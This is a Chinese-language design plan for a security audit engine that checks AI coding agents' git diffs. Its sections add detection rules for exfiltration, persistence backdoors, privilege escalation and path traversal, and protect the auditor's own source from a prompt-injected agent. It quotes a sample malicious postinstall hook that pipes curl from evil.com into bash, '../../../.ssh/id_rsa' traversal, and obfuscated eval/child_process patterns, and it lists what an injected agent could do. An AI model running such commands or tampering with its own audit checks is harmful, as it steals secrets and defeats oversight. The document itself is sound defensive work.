### 三、新增安全规则（填补四大盲区）

| 规则 | 检测目标 | evidenceMode | ruleClass | 层级 |
|------|---------|:------------:|-----------|:----:|
| **A20 不泄外联** | git diff 中出现往外部 URL 发送数据的代码（`curl`/`wget`/`fetch` 指向非白名单域名，或把密钥/凭证 POST 到外部） | git-diff | 业务底线 | 第 0 层 |
| **A21 不植后门** | git diff 中出现创建 LaunchAgent/cron job/systemd service/注册表自启项的代码 | git-diff | 业务底线 | 第 0 层 |
| **A22 不越权限** | git diff 中出现 `chmod 777`/修改 sudoers/setuid/setgid/chown root 等 | git-diff | 业务底线 | 第 0 层 |
| **A23 不逃路径** | git diff 中出现路径穿越（`../../../`）和 symlink 逃逸——A1 只匹配 basename，`../../id_rsa.bak` 可绕过 | git-diff | 业务底线 | 第 0 层 |

**设计依据**：现有 21 条规则全部聚焦"Agent 改了什么文件"，但对"Agent 做了什么动作"和"路径变形"的检测完全空白。一个被注入的 Agent 可以：(1) 偷偷把 `.env` POST 到外部 (2) 偷建 LaunchAgent 永久驻留 (3) `chmod 777` 整个目录 (4) 用 `../../../.ssh/id_rsa` 绕过 A1 basename 匹配。这四类是 Agent 安全的最高危场景，当前零检测。

### 四、规则精简（E3 并入 A11）

E3「不滥删除」检测单文件删除>100 行——与 A11「不滥资源」的删除文件数>20 是同一语义的两种维度（行数 vs 文件数）。合并后 A11 同时管两个维度，E3 删除，规则总数从 25 降回 24。

### 五、现有规则增强（A10 依赖混淆 + postinstall 脚本注入检测）

A10「不引毒源」当前只检测依赖来源 URL 是否可疑（`raw.githubusercontent` / `git+http`）。增强后增加两个维度：

1. **typosquatting 检测**——包名与知名包的 Levenshtein 距离<=2 时告警（如 `lodsh` vs `lodash`）。不新增编号，扩展现有规则
2. **postinstall 脚本注入检测**——npm 供应链攻击最经典的不是 typosquatting，而是在 `package.json` scripts 中加 `postinstall`/`preinstall` 钩子执行恶意命令（如 `"postinstall": "curl evil.com/x | bash"`）。A10 检查包来源，A20 检查外传数据，但 postinstall 是"下载执行"不是"上传数据"——两头不沾，是 A10/A20 之间的真实缝隙。增强后 A10 检测 scripts hook 中的 `curl|bash`/`eval`/`child_process` 等危险执行命令

## 六、结构性地基加固（CRITICAL — 不修则 A20-A23 白加）

> 来源：v1.2.5 审计层最终深度审查。三个结构性地基问题如果不修，新增 A20-A23 等于给安全门上了把可以随便拆的锁。

### 6.1 BASELINE_RULE_KEYS 扩展（P0）

**问题**：`@sofagent/core` 的 `BASELINE_RULE_KEYS` 只有 5 条（`a1/a2/a9/a10/a11`）。runner.ts 的保护逻辑：即使 config.yml 写了 `a1: false`，A1 仍然生效。但 A20-A23 作为 critical 层安全红线，**不在基线保护列表**——企业 IT 在 config.yml 写 `a20: false`，网络外联检测就静默关闭了。

**修复**：`BASELINE_RULE_KEYS` 从 5 条扩展到 9 条，加入 `a20/a21/a22/a23`。安全红线不可 config 关闭。

| 文件 | 改动 |
|------|------|
| `engine/core/src/config.ts`（或 BASELINE 定义处） | `BASELINE_RULE_KEYS` 增加 a20-a23 |

### 6.2 critical 层全量收集（P0）

**问题**：runner.ts 的 fast-fail 逻辑——critical 层第一个 FAIL 就立即 return，后续 critical 规则全部 SKIPPED。实际场景：Agent 同时碰 `.env`（A1）+ curl 外传（A20）+ 建 LaunchAgent 后门（A21）——当前只报 A1，另外两个安全红线被跳过。审计报告 1 个问题，实际 3 个违规。

**修复**：critical 层 8 条规则全部跑完，收集所有 FAIL，然后统一 fast-fail（跳过后续层）。性能成本 <1ms（8 条正则），安全可见性大幅提升。后续层（warning/crutch/extended）的 fast-fail 保护不变。

| 文件 | 改动 |
|------|------|
| `engine/audit/src/rules/runner.ts` | critical 层循环改为全量收集 + 统一 fast-fail |

### 6.3 审计引擎源码自保护（P1）

**问题**：当前没有规则检测"Agent 修改了审计引擎源码"。Agent 被注入后可直接编辑 `runner.ts` 删掉自己的 critical 归属——**审计引擎审计不了自己的修改**。

**修复**：在 A16（非授权文件变更，extended 层）受保护路径列表中加入审计引擎核心源码路径（`engine/audit/src/rules/` 下所有 `.ts` 文件 + `shared/patterns.ts`）。

| 文件 | 改动 |
|------|------|
| `engine/audit/src/rules/rule-a16-unauthorized-change.ts` | 新增 `AUDIT_ENGINE_PROTECTED_PATHS` 路径列表 |

> **设计决策**：放在 A16（extended 层）而非提升到 critical。① v1.2.5 不宜再加新 critical 规则 ② A16 的路径保护能力现成 ③ 只需扩展路径列表，不改检测逻辑。但 A16 是 opt-in，企业需开启 `extendedRulesEnabled: true` 才生效——后续版本可考虑提升为 default rule。

## 七、检测盲区补全

### 7.1 A9 扩展：动态执行模式告警（P2）

**背景**：Agent 可写 `eval(atob('...'))` / `new Function(...)()` / `require('child_process').exec(...)` 绕过静态审计。A2 能解码 base64 检查密钥但不检查代码执行。A9 检测 prompt injection 但不检测代码层 obfuscation。

**修复**：A9 的 `MEDIUM_CONFIDENCE_PATTERNS` 新增动态执行模式（eval / new Function / child_process / exec+危险命令），命中时 WARN。

> **定位**：此项是"补一层告警"，不是完整防护。真正的动态执行拦截留 v1.3.0 运行时审计（wrapToolCall middleware 在执行时刻拦截）。v1.2.5 只做静态告警。

| 文件 | 改动 |
|------|------|
| `engine/audit/src/rules/rule-a9-no-injection.ts` | `MEDIUM_CONFIDENCE_PATTERNS` 新增 4 条动态执行模式 |

### 7.2 shared/patterns.ts 扩展为全规则共享库（P2）

**背景**：§一.5 已把 ToolGate 和 A2 的 secret 正则统一到 `shared/patterns.ts`。但 A9 的脱敏正则和 A2 的检测正则也是独立实现。长期来看，所有跨规则的共享正则都应收敛到一个文件——否则改一处忘另一处，又产生漂移。

**修复**：`shared/patterns.ts` 扩展，纳入 `REDACTION_PATTERNS`（从 A9 迁移）+ `DOMAIN_WHITELIST`（A20）+ `DANGEROUS_SCRIPT_CMDS`（A10 postinstall）。

> **定位**：收敛重构，降低未来维护成本。不新增检测能力，不改变现有行为。

| 文件 | 改动 |
|------|------|
| `engine/audit/src/rules/shared/patterns.ts` | 扩展为全规则共享库（secret + redaction + domain + script） |

## 九、🔧 daemon 可靠性专题（新增主线）

> 来源：四轮独立审查 P0-1（--init plist 假成功）+ P0-2（im-outbox 爆炸）+ 14:30 bugfix 修复实践。
> 定位：daemon 是"7×24 常驻"承诺的载体。如果它自己不稳定，激活链跑起来也是空话。

### 已修复（14:30 bugfix 批次）

| 编号 | 问题 | 修复 |
|------|------|------|
| P0-1 | `--init` 无条件覆写全局 `~/Library/LaunchAgents/com.sofagent.daemon.plist`；npx 场景生成指向不存在路径的坏 plist 仍打印"✅ 成功" | --init 交互化（已存在时询问覆盖，非 TTY 默认 N）+ plist 路径加 `engine/daemon/` 前缀校验 + 写入后 `launchctl load` 验证 |
| P0-2 | `~/.sofagent/data/im-outbox/` 累积 10540 个重复"知识沉淀周报"（41MB，~1700/天），疑似 pushKnowledgeSummary 循环/重试缺陷 | 去重（同标题 24h 内不重发）+ 7 天自动清理 + 目录上限 100 文件 |

### 结构性加固（本版本新增）

| 项 | 问题 | 方案 |
|------|------|------|
| **写入去重 + 重试上限** | pushKnowledgeSummary 等推送函数无重试上限，失败后无限循环写入 | 所有推送函数加 `maxRetries=3` + 指数退避（1s/4s/16s）；超限写 `daemon-errors.jsonl` 不再重试 |
| **plist 路径校验** | `--init` 生成 plist 时不验证 ProgramArguments 路径是否存在 | 写入前 `fs.existsSync(programPath)` 校验；不存在则 WARN 不写 plist（不打印假成功） |
| **健康自检** | daemon 启动后无自检机制，crash loop 无人知晓 | 启动时写 `daemon-health.json`（pid + startTime + version + status:"running"）；watchdog 每 5min 更新 lastHeartbeat；Dashboard 消费此文件判断 daemon 是否活着 |
| **im-outbox 生命周期** | 推送成功后文件残留，无清理机制 | 推送成功 → 立即删除源文件；推送失败 → 移入 `im-outbox/failed/`（不阻塞主循环）；7 天 cron 清理 failed/ |

### 涉及文件

| 文件 | 改动 |
|------|------|
| `engine/daemon/src/push.ts`（或等效推送模块） | maxRetries + 指数退避 + 去重逻辑 |
| `engine/daemon/src/init.ts` | plist 路径校验（existsSync）+ 写入后 launchctl 验证 |
| `engine/daemon/src/health.ts`（新建） | 健康自检：写 daemon-health.json + heartbeat 更新 |
| `engine/daemon/src/im-outbox.ts`（或等效） | 成功删除 / 失败移入 failed/ / 7 天清理 |
| `engine/daemon/src/__tests__/daemon-reliability.test.ts`（新建） | 覆盖：重试上限 / plist 校验 / 去重 / 健康文件写入 |

## 十、🖥️ HTML Dashboard 全新实现（v1.2.5 补充）

> 与 bash Dashboard（`tools/sofagent-dashboard.sh`）并存：bash 面向终端（--watch/--trend/--full），HTML 面向浏览器（导航化多页 + 实时数据）。两者数据口径一致。

### 交付

| 文件 | 说明 |
|------|------|
| `dashboard.html`（仓库根目录） | 单文件零依赖 SPA，7 页导航：驾驶舱 / FDE引导 / AI节点 / 本体结构 / 知识库 / 引擎 / 工具箱 |

### 数据链路（关键设计）

- **`/api/summary` 复用 bash dashboard 的 jq 聚合口径**——PASS/WARN/FAIL 统计、本周 TOP3 违规、数据主权聚合，全部与 `tools/sofagent-dashboard.sh` 的 `render_rules` / `render_sovereignty` 同一逻辑（`dataFlow.destination=="cloud-api"` / `direction=="outbound"` 判定），HTML 与终端看到的是同一份数据
- `/data/*` 映射 `~/.sofagent/data/*`；`history.jsonl` 截断最近 500 条（12MB → 1.3MB）防浏览器卡死
- **File System Access API**：Chrome/Edge 用户可直接点"连接数据目录"选 `~/.sofagent/data`，免服务器（Safari 不支持自动隐藏按钮）
- 静态打开 HTML（无服务器）自动降级为示例数据 + 提示
